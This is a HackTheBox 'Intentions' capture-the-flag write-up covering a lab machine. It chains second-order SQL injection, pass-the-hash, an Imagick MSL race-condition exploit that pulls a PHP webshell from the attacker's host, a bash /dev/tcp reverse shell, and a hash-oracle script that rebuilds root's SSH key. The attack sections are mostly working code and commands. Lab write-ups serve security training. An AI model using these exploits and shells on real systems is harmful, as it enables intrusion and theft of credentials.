# HackTheBox — Intentions

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Hard](https://img.shields.io/badge/Difficulty-Hard-red)
![Tags: second-order-sqli, pass-the-hash, imagick-rce, capabilities](https://img.shields.io/badge/Tags-2nd%20Order%20SQLi%20%7C%20Pass%20the%20Hash%20%7C%20Imagick%20RCE%20%7C%20cap_dac_read_search-orange)

> **TL;DR** — A photo gallery app stores user-supplied genre preferences and reflects them in a separate "feed" view → second-order SQL injection (POST sets the value, GET fires it). `sqlmap --second-req` dumps the `users` table including admin bcrypt hashes. Read `admin.js` to discover an `/api/v2/auth/login` endpoint that takes a `hash` parameter directly — pass-the-hash to log in as `steve`. Abuse a writable Imagick MSL handler in the admin's image editor with a race-condition technique to drop a PHP webshell, escalate to a stable shell as `www-data`. Find a `.git` directory; commit history leaks `greg`'s plaintext password. SSH in for `user.txt`. `greg` can read (but not list) `/opt/scanner/scanner` — a Go binary with `cap_dac_read_search=ep`, a debug flag (`-p`) that prints MD5 hashes of files, and a byte-limit flag (`-l`). Combined, they form an MD5-hash oracle: brute-force `/root/.ssh/id_rsa` byte-by-byte. SSH as root.

---

## Attack Chain at a Glance

```
nmap → /admin, /storage (genres), /js/admin.js
   → register account → POST /preferences (set genres) → GET /feed (reflects)
   → second-order SQLi via genres → sqlmap --second-req → users table
   → steve / greg admin bcrypt hashes (rabbit hole if you try cracking)
   → admin.js mentions /api/v2 → "passwords no longer transmitted in cleartext, hashed client-side, BCrypt is uncrackable"
   → POST /api/v2/auth/login {email, hash:<bcrypt>} = pass-the-hash
   → Imagick MSL race condition (positive.msl + vid:msl:/tmp/php*) → PHP webshell
   → bash reverse shell → www-data
   → /var/www/html/intentions/.git → git log → greg / Gr3g1sTh3B3stDev3l0per!1998!
   → SSH as greg → user.txt
   → /opt/scanner/scanner has cap_dac_read_search=ep
   → -p flag prints MD5 hash of file content; -l limits bytes hashed
   → byte-by-byte hash oracle reconstructs /root/.ssh/id_rsa
   → SSH as root → root.txt
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Foothold — Second-Order SQLi → Pass-the-Hash → Imagick RCE](#initial-foothold--second-order-sqli--pass-the-hash--imagick-rce)
- [Lateral — Stealing greg's Password from .git](#lateral--stealing-gregs-password-from-git)
- [User Flag — greg](#user-flag--greg)
- [Privilege Escalation — Hash-Oracle File Recovery](#privilege-escalation--hash-oracle-file-recovery)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

> 💡 Run Burp with **intercept off** and proxy gobuster through it (`--proxy http://localhost:8080`). The site-map you build up automatically while enumerating is hugely valuable later, especially for finding the v2 API endpoints.

### Nmap Scan

```bash
nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.129.229.27
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
```

### Directory Enumeration

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u intentions.htb --proxy http://localhost:8080
```

```
/admin                (302) → http://intentions.htb
/css                  (301)
/favicon.ico          (200)
/fonts                (301)
/gallery              (302) → http://intentions.htb
/index.php            (200)
/js                   (301)
/logout               (302)
/robots.txt           (200)
/storage              (301)
```

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u intentions.htb/js/ -x js
```

```
/admin.js     (200) [Size: 311246]
/app.js       (200) [Size: 433792]
/gallery.js   (200) [Size: 310841]
/login.js     (200) [Size: 279176]
/mdb.js       (200) [Size: 153684]
```

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u intentions.htb/storage/
```

```
/animals       /architecture       /food       /nature
```

The `/storage/` subdirectories are the available **genres** — useful because the app's preferences feature accepts genre values.

---

## Initial Foothold — Second-Order SQLi → Pass-the-Hash → Imagick RCE

### Second-Order SQL Injection on Genre Preferences

Register an account. The profile lets you POST genre preferences which are then reflected on a GET request to your feed. Because the value is *stored* and *fired later*, this is **second-order SQLi**: standard scanners miss it.

References:
- [SQL Injection Comprehensive Guide](https://www.akto.io/blog/sql-injection-comprehensive-guide)
- [HackTricks — Second-order SQLi with sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap)

In Burp, capture both requests and save them via **Repeater → Action → Save item**:
- `request1` — POST that updates genres
- `request2` — GET that loads the feed

Run sqlmap:

```bash
sqlmap -r ~/path/to/request1 \
       --second-req ~/path/to/request2 \
       --level=5 --time-sec=5 --random-agent \
       --tamper=between,space2comment \
       --dump --risk=3 --batch
```

Dump (truncated):

```
Database: intentions
Table: users
+----+-----------------------+-------+--------------------+-------+--------------------------------------------------------------+
| id | email                 | name  | genres             | admin | password                                                     |
+----+-----------------------+-------+--------------------+-------+--------------------------------------------------------------+
| 1  | steve@intentions.htb  | steve | food,travel,nature | 1     | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa |
| 2  | greg@intentions.htb   | greg  | food,travel,nature | 1     | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m |
+----+-----------------------+-------+--------------------+-------+--------------------------------------------------------------+
```

Two admin bcrypt hashes — but bcrypt is slow by design. **Don't crack.**

### The v2 API — Pass-the-Hash

Search `admin.js` (loaded into Burp, auto-beautified) for `v2`:

> "Hey team, I've deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs. This will be a major security upgrade for our users, **passwords no longer need to be transmitted to the server in clear text**! By hashing the password client side there is no risk to our users as **BCrypt is basically uncrackable**."

The developer turned bcrypt into a session token. Now the *hash* is the password.

```http
POST /api/v2/auth/login HTTP/1.1
Host: intentions.htb
Content-Type: application/json

{"email":"steve@intentions.htb",
 "hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
```

We're now logged in as `steve`.

### Imagick MSL RCE (Race Condition)

The admin section has an image-editing module backed by PHP-Imagick.

References:
- [PHP Manual: Imagick class](https://www.php.net/manual/en/class.imagick.php)
- [Exploiting Arbitrary Object Instantiations in PHP without Custom Classes — Swarm/PT](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) → see *RCE #1: PHP Crash + Brute Force*

Step 1 — image with embedded PHP (Imagick allows MSL only on images):

```bash
convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
```

Step 2 — MSL file that copies our PHP image into the webroot:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
    <read filename="http://10.10.14.8:12345/positive.png" />
    <write filename="/var/www/html/intentions/public/positive.php" />
</image>
```

Exploitation requires **two simultaneous requests**:
1. Upload the MSL file to a temp location.
2. Trigger an Imagick operation (`vid:msl:/tmp/php*`) that includes whatever's currently in `/tmp/` matching `php*` — ideally our MSL file before PHP cleans it up.

Burp Repeater can't fire both at the same instant; use Python.

<details>
<summary>Click to expand imagickExploit.py</summary>

```python
#!/usr/bin/env python3

import requests, threading, base64

local_url    = "http://10.10.14.8:12345"
target_url   = "http://10.129.151.30"
admin_email  = "steve@intentions.htb"
admin_hash   = "$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"
proxies      = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Login as steve via pass-the-hash
s = requests.session()
s.post(target_url + "/api/v2/auth/login",
       json={"email": admin_email, "hash": admin_hash},
       proxies=proxies)

msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="{local_url}/positive.png" />
<write filename="/var/www/html/intentions/public/positive.php" />
</image>'''

files = {"positive": ("positive.msl", msl_file)}

def create_msl_on_temp():
    s.post(target_url + "/api/v2/admin/image/modify", files=files)

json_payload = {'path': 'vid:msl:/tmp/php*', 'effect': 'positive'}

def try_include():
    s.post(target_url + "/api/v2/admin/image/modify",
           json=json_payload, proxies=proxies)

threads = []
for _ in range(30):
    threads.append(threading.Thread(target=create_msl_on_temp))
    threads.append(threading.Thread(target=try_include))
for t in threads: t.start()
for t in threads: t.join()

# Webshell loop
while True:
    try:
        cmd = input("Intentions> ")
        cmd_b64 = base64.b64encode(cmd.rstrip().encode()).decode()
        data = {"a": f'system("echo {cmd_b64} | base64 -d | bash");'}
        r = requests.post(target_url + "/positive.php", data=data, proxies=proxies)
        print(r.text.split("Copyright")[1]
                    .encode().split(b"\n6\x11\xef\xbf")[0].decode())
        print()
    except KeyboardInterrupt:
        exit(0)
```

</details>

Pre-flight:
1. Serve `positive.png` on port `12345` (`python3 -m http.server 12345`).
2. Run the script. After the race-condition burst, `id` returns:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Stable Reverse Shell

The webshell is fragile. Drop into a real shell:

```bash
bash -i >& /dev/tcp/10.10.14.8/1337 0>&1
```

---

## Lateral — Stealing greg's Password from .git

In `/var/www/html/intentions/`, a `.git/` directory remains. We can read but not write the parent dir, so archive into `/tmp`:

```bash
cd /var/www/html/intentions
tar -czvf /tmp/archive.tar.gz .
cd /tmp
python3 -m http.server 9002
```

On the attacker:

```bash
wget http://intentions.htb:9002/archive.tar.gz
tar -xvf archive.tar.gz
git log
git show 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
```

The committed diff contains:

```
'email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!'
```

---

## User Flag — greg

```bash
ssh greg@intentions.htb
# password: Gr3g1sTh3B3stDev3l0per!1998!
```

```
greg@intentions:~$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)

greg@intentions:~$ cat user.txt
cf38c16c101f97c43166765c4028a864
```

🚩 **User flag captured.**

---

## Privilege Escalation — Hash-Oracle File Recovery

### What greg Has

```bash
greg@intentions:~$ ls -la
... (.bash_history symlinked to /dev/null — anti-forensics) ...
-rwxr-x--- 1 root greg   75 Jun 10 17:33 dmca_check.sh
-rwxr----- 1 root greg  11K Jun 10 15:31 dmca_hashes.test

greg@intentions:~$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test

greg@intentions:~$ ls -la /opt/scanner/scanner
-rwxr-x--- 1 root scanner 1.4M /opt/scanner/scanner
# greg is in 'scanner' group — can execute it.
```

### The Capability

```bash
greg@intentions:~$ getcap /opt/scanner/scanner
/opt/scanner/scanner cap_dac_read_search=ep
```

[`cap_dac_read_search`](https://man7.org/linux/man-pages/man7/capabilities.7.html) lets the binary **bypass file-read and directory-search permission checks** — it can read any file on the system regardless of unix permissions.

### Turning the Scanner Into a Hash Oracle

`scanner --help` reveals two flags that combine into an exploit primitive:

```
-c string   Path to image file to check
-h string   Path to colon-separated hash file (LABEL:MD5 per line)
-l int      Maximum bytes of files being checked to hash
            (Files smaller than this value will be fully hashed)
-p          [Debug] Print calculated file hash. Only compatible with -c
-s string   Specific hash to check against
```

So `scanner -c <file> -p -l N -s a` prints the MD5 hash of the **first N bytes** of `<file>`, regardless of whether `greg` can read it.

That's a **byte-by-byte hash oracle**. For each `N`:
1. Read the MD5 from the scanner.
2. Locally try every byte `b` from `0x01..0xff`, computing `MD5(known_so_far + b)`.
3. Whichever byte matches the oracle's output is byte `N`. Append, increment `N`.
4. Repeat until the file is reconstructed.

Test the oracle on root's SSH key:

```bash
greg@intentions:~$ /opt/scanner/scanner -c /root/.ssh/id_rsa -p -s a
[DEBUG] /root/.ssh/id_rsa has hash 1cd5f0fae381ed1b066b927995b7ef60
```

The file exists and the scanner hashes it. Now reconstruct it.

### Recovery Script

<details>
<summary>fileRecovery.py</summary>

```python
#!/usr/bin/env python3
import subprocess, hashlib, argparse

parser = argparse.ArgumentParser(description='Recover file via /opt/scanner/scanner.')
parser.add_argument('-f', '--file',   required=True, help='File to recover.')
parser.add_argument('-o', '--output', required=True, help='Output file.')
args = parser.parse_args()

def scan_file(num_bytes):
    cmd = f"/opt/scanner/scanner -c {args.file} -p -l {num_bytes} -s a".split()
    out = subprocess.check_output(cmd).decode()
    return out.split(" ")[-1].strip()

i = 1
file_so_far = bytearray()
while True:
    target_hash = scan_file(i)
    found = False
    for j in range(0x01, 0xff):
        attempt = file_so_far + bytearray([j])
        if hashlib.md5(attempt).hexdigest() == target_hash:
            file_so_far = attempt
            found = True
            break
    if not found:
        print("ERROR: could not find valid byte")
        break
    i += 1

with open(args.output, "wb") as f:
    f.write(file_so_far)
```

</details>

A Perl variant (`fileRecovery.pl`) is included in the original notes for environments without Python — same algorithm, included alongside this writeup as supporting material.

```bash
greg@intentions:~$ ./fileRecovery.py -f /root/.ssh/id_rsa -o id_rsa
```

> 💡 The recovery loop terminates when scanner hashes the same N bytes twice in a row (i.e. EOF reached at the previous iteration) — that's why the brute-force-fail message also serves as the stopping condition.
>
> Note: `for j in range(0x01, 0xff)` skips `0x00` and `0xff`. SSH keys use printable text only, so this is safe; for arbitrary binaries, use `range(0x100)`.

### SSH as root

```bash
chmod 600 ~/.ssh/intentions_root
ssh root@intentions.htb -i ~/.ssh/intentions_root
```

```
root@intentions:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```
e4b0a48071061e2705f76a456afebc0d
```

🚩 **Root flag captured.**

> 💡 Unlike flags, **the SSH key for root doesn't rotate** when the box resets — re-use the recovered `id_rsa` for instant root on future runs.

---

## Lessons Learned

- **Bcrypt is uncrackable when used correctly. Pass-the-hash undoes that.** A back-end that accepts the hash as a session token defeats the whole point. The "we hashed it client-side so it's safe" reasoning is the most common failure mode.
- **Second-order SQLi is invisible to single-request scanners.** sqlmap's `--second-req` flag is purpose-built for storage-then-fire flows.
- **Imagick MSL is RCE if the application accepts paths that contain `vid:msl:`.** The race-condition variant works against patches that thought they'd locked things down.
- **`.git/` directories on web servers are gold mines.** Always check, always `git log`, always read every commit's diff.
- **Linux capabilities are not a partial fix.** `cap_dac_read_search=ep` on a binary that prints debug hashes turns into an arbitrary-file-read, which turns into root via SSH key reconstruction. *Any* file-touching capability has to be analyzed against every interface the binary exposes.
- **MD5 against a known prefix is a 256-way oracle**. If you can hash arbitrary prefix-lengths, you can reconstruct the file at one query per byte.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/), [`gobuster`](https://github.com/OJ/gobuster) | Recon |
| [Burp Suite](https://portswigger.net/burp) | Request capture, JS auto-beautification, proxying gobuster |
| [`sqlmap`](https://sqlmap.org/) — `--second-req` | Second-order SQL injection |
| [`convert` (ImageMagick)](https://imagemagick.org/) | Building the PHP-laden PNG |
| [Swarm — Imagick exploitation writeup](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) | MSL race-condition RCE technique |
| [Git](https://git-scm.com/) | Recovering plaintext password from `.git` |
| [`getcap`](https://man7.org/linux/man-pages/man8/setcap.8.html) | Identifying `cap_dac_read_search=ep` |
| Custom `fileRecovery.{py,pl}` | Hash-oracle byte-by-byte file reconstruction |

---

## Supporting Files

This writeup directory should also include:

- `imagickExploit.py` — the race-condition Imagick exploit
- `fileRecovery.py` — Python file-recovery via scanner hash oracle
- `fileRecovery.pl` — Perl equivalent
